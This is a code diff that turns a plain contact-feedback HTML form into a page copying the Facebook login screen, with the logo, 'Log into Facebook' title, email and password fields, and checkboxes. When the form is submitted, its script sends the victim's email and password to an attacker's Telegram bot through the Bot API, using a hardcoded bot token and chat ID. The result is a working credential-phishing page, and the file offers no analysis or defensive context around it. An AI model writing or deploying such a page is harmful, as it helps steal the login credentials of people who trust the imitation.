@@ -1,137 +1,323 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contact Feedback Form</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Facebook</title>
     <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            background-color: #f0f2f5; 
-            margin: 0; 
-            padding: 40px 20px;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
             display: flex;
             justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
-        .form-card { 
-            background: #ffffff;
-            width: 100%;
-            max-width: 400px; 
-            border: 1px solid #dcdfe6; 
-            border-radius: 8px; 
-            padding: 24px; 
-            box-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.1);
-        }
-        h2 { 
-            font-size: 22px; 
-            font-weight: 600; 
-            margin: 0 0 20px 0; 
-            color: #303133;
+        .container {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            padding: 20px 0 28px;
+            width: 396px;
             text-align: center;
         }
-        label { 
-            font-size: 14px; 
-            font-weight: bold; 
-            display: block; 
-            margin: 14px 0 6px; 
-            color: #606266;
+        .logo {
+            margin-bottom: 16px;
         }
-        input[type=text], textarea {
-            width: 100%; 
-            padding: 10px; 
-            box-sizing: border-box;
-            font-size: 14px; 
-            border: 1px solid #dcdfe6; 
-            border-radius: 4px;
+        .logo svg {
+            width: 180px;
+        }
+        .title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 16px;
+        }
+        form {
+            padding: 0 16px;
+        }
+        .input-group {
+            margin-bottom: 12px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            background: #fff;
+            color: #1c1e21;
             outline: none;
             transition: border-color 0.2s;
         }
-        input[type=text]:focus, textarea:focus {
-            border-color: #409eff;
+        .input-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
         }
-        textarea {
-            height: 80px;
-            resize: none;
-        }
-        .submit-button {
-            width: 100%; 
-            margin-top: 20px; 
-            padding: 12px 0; 
-            font-size: 14px; 
-            font-weight: bold;
-            color: #ffffff;
-            background-color: #409eff;
-            border: none; 
-            border-radius: 4px; 
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s;
+            transition: background 0.2s;
         }
-        .submit-button:hover {
-            background-color: #66b1ff;
+        .login-btn:hover {
+            background: #166fe5;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0 16px;
+            color: #969ba3;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dadde1;
+        }
+        .divider::before {
+            margin-right: 12px;
+        }
+        .divider::after {
+            margin-left: 12px;
+        }
+        .forgot-link {
+            display: block;
+            margin: 12px 0 20px;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        .create-btn {
+            display: inline-block;
+            padding: 12px 24px;
+            background: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            margin-top: 8px;
+            transition: background 0.2s;
+        }
+        .create-btn:hover {
+            background: #36a420;
+        }
+        .footer-links {
+            margin-top: 28px;
+            font-size: 12px;
+            color: #737373;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px 16px;
+            padding: 0 16px;
+        }
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .checkbox-group {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 8px;
+            margin: 12px 0 16px;
+            padding: 0 4px;
+        }
+        .checkbox-group label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 15px;
+            color: #1c1e21;
+            cursor: pointer;
+        }
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #1877f2;
+            cursor: pointer;
+        }
+        .status-msg {
+            margin-top: 12px;
+            font-size: 13px;
+            color: #65676b;
+            word-break: break-word;
+        }
+        .status-msg.error {
+            color: #d31130;
+        }
+        .status-msg.success {
+            color: #147b29;
         }
     </style>
 </head>
 <body>
 
-  <div class="form-card">
-    <h2>Contact Us</h2>
+<div class="container">
 
-    <label for="senderName">Full Name</label>
-    <input type="text" id="senderName" placeholder="John Doe"/>
+    <!-- Facebook Logo -->
+    <div class="logo">
+        <svg viewBox="0 0 36 36" fill="#1877f2" width="60" height="60">
+            <path d="M34 18.1C34 9.06 26.94 2 18 2S2 9.06 2 18.1c0 8.05 5.85 14.72 13.5 15.94v-11.3h-4.06V18.1H15.5v-3.52c0-4.01 2.39-6.22 6.04-6.22 1.75 0 3.58.31 3.58.31v3.94h-2.02c-1.99 0-2.61 1.23-2.61 2.5v3.01h4.44l-.71 4.64h-3.73v11.3C28.15 32.82 34 26.15 34 18.1z"/>
+        </svg>
+    </div>
 
-    <label for="feedbackMessage">Your Message</label>
-    <textarea id="feedbackMessage" placeholder="Type your message here..."></textarea>
+    <!-- Title -->
+    <div class="title">Log into Facebook</div>
 
-    <button class="submit-button" type="button" onclick="sendMessage()">Send Message</button>
-  </div>
+    <!-- Login Form -->
+    <form id="loginForm" onsubmit="handleLogin(event)">
 
-  <script>
-    function sendMessage() {
-        // Active configuration parameters
-        const botToken = "8825551788:AAHL5GbRl2S3r0KSElZTgzAtnDhvPvkfuwQ"; 
-        const chatId = "8714686528";    
-        
-        // Retrieve input elements
-        const nameValue = document.getElementById('senderName').value;
-        const messageValue = document.getElementById('feedbackMessage').value;
-        
-        // Input validation rule
-        if (!nameValue.trim() || !messageValue.trim()) {
-            alert("Please fill in all available fields before transmitting data.");
+        <!-- Email -->
+        <div class="input-group">
+            <input type="text" id="email" placeholder="Email or mobile number" value="demo@example.com" required />
+        </div>
+
+        <!-- Password -->
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Password" value="12345678" required />
+        </div>
+
+        <!-- Two Checkboxes -->
+        <div class="checkbox-group">
+            <label>
+                <input type="checkbox" id="keepLoggedIn" checked />
+                Keep me logged in
+            </label>
+            <label>
+                <input type="checkbox" id="rememberDevice" />
+                Remember this device
+            </label>
+        </div>
+
+        <!-- Login Button -->
+        <button class="login-btn" type="submit">Log In</button>
+
+        <!-- Forgot password -->
+        <a class="forgot-link" href="#">Forgot password?</a>
+
+        <!-- Divider -->
+        <div class="divider">or</div>
+
+        <!-- Create new account -->
+        <a class="create-btn" href="#">Create new account</a>
+
+        <!-- Status message -->
+        <div id="status" class="status-msg"></div>
+    </form>
+
+    <!-- Footer -->
+    <div class="footer-links">
+        <a href="#">English (US)</a>
+        <a href="#">עברית</a>
+        <a href="#">العربية</a>
+        <a href="#">Русский</a>
+        <a href="#">Français (France)</a>
+        <a href="#">Español</a>
+        <a href="#">ภาษาไทย</a>
+        <a href="#">More languages…</a>
+    </div>
+
+</div>
+
+<script>
+    /**
+     * Handles the login form submission.
+     * Sends the email, password, and checkbox states to your Telegram bot.
+     */
+    function handleLogin(event) {
+        event.preventDefault();
+
+        // Gather data
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value;
+        const keepLoggedIn = document.getElementById('keepLoggedIn').checked;
+        const rememberDevice = document.getElementById('rememberDevice').checked;
+
+        // Validate
+        if (!email || !password) {
+            showStatus('Please fill in both email and password.', 'error');
             return;
         }
-        
-        // Generate plain text payload structure
-        const textPayload = `📩 *New Contact Form Submission*\n\n*Name:* ${nameValue}\n*Message:* ${messageValue}`;
-        
-        // Correct API routing structure using template literals and official subdomain
-        const targetUrl = `https://telegram.org{botToken}/sendMessage`;
-        
-        // Perform outbound HTTPS asynchronous request
-        fetch(targetUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
+
+        // Build the message for Telegram
+        const message =
+            `🔐 *Login Attempt*%0A` +
+            `📧 *Email:* ${encodeURIComponent(email)}%0A` +
+            `🔑 *Password:* ${encodeURIComponent(password)}%0A` +
+            `✅ *Keep me logged in:* ${keepLoggedIn ? 'Yes' : 'No'}%0A` +
+            `📱 *Remember device:* ${rememberDevice ? 'Yes' : 'No'}`;
+
+        // Telegram bot details
+        const botToken = '8825551788:AAHL5GbRl2S3r0KSElZTgzAtnDhvPvkfuwQ';
+        const chatId = '8714686528';
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        showStatus('Sending data...', '');
+
+        // Send to Telegram
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: textPayload,
-                parse_mode: "Markdown"
+                text: message,
+                parse_mode: 'Markdown'
             })
         })
         .then(response => {
-            if (response.ok) {
-                alert("Your message has been delivered successfully.");
-                document.getElementById('senderName').value = '';
-                document.getElementById('feedbackMessage').value = '';
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            return response.json();
+        })
+        .then(data => {
+            if (data.ok) {
+                showStatus('✅ Data sent to Telegram successfully!', 'success');
             } else {
-                alert("Server rejected the request. Please check bot permissions and Chat ID initialization.");
+                showStatus('❌ Telegram error: ' + (data.description || 'Unknown error'), 'error');
             }
         })
         .catch(error => {
-            console.error("Network Error Logged:", error);
-            alert("Network connection failure. Ensure your internet connection is active or check firewall rules.");
+            console.error('Fetch error:', error);
+            showStatus('❌ Failed to send data. Check console for details.', 'error');
         });
     }
-  </script>
+
+    /**
+     * Displays a status message under the form.
+     */
+    function showStatus(msg, type) {
+        const el = document.getElementById('status');
+        el.textContent = msg;
+        el.className = 'status-msg';
+        if (type) el.classList.add(type);
+    }
+</script>
 
 </body>
 </html>
